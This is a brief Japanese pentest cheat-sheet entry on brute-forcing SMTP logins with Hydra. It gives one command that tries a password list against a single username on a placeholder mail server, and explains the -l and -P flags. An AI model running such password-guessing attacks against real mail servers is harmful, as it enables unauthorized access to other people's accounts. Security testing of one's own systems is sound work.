# Hydraを使用したSMTPブルートフォース攻撃
```bash
hydra -l username -P /path/to/passwordlist.txt smtp://smtp.example.com
```
- **-l**: 単一のユーザー名を指定します。
- **-P**: パスワードリストファイルを指定します。
